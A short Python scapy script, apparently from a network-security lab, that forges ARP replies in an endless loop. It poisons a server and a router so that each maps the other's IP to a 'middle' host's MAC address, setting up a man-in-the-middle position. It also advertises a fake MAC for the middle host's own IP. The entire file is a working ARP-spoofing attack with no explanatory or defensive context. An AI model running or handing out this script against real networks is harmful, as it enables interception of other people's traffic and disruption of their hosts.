from scapy.all import *
server_ip = "198.13.0.14"
router_ip = "198.13.0.1"
middle_ip = "198.13.0.15"
adresa_middle = "02:42:c6:0d:00:0f"
adresa_fictiva = "03:43:c6:0d:00:0f"
broadcast = "ff:ff:ff:ff:ff:ff"

a = ARP()
a.pdst=server_ip
a.hwsrc=adresa_middle
a.psrc=router_ip
a.hwdst= broadcast

b = ARP()
b.pdst=router_ip
b.hwsrc=adresa_middle
b.psrc=server_ip
b.hwdst= broadcast

c = ARP()
c.pdst=server_ip
c.hwsrc=adresa_fictiva
c.psrc=middle_ip
c.hwdst= broadcast

d = ARP()
d.pdst=router_ip
d.hwsrc=adresa_fictiva
d.psrc=middle_ip
d.hwdst= broadcast

while True:
    send(a)
    send(b)
    send(c)
    send(d)
    time.sleep(2)